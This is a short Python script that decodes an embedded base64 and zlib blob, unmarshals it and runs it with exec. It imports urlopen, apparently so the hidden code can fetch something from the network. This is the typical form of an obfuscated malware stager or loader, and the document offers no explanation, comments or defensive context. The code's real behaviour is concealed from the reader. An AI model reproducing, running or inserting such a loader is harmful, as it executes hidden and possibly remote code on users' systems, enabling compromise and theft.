import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWFgYCgtyskvSM3TUM8oKSmw0tc3NNYzNDLTMzSz0DM0N7QyNDa20NcvLklMTy0q1k92dNQrqFTX1CtKTUzR0AQASsISEw==')))))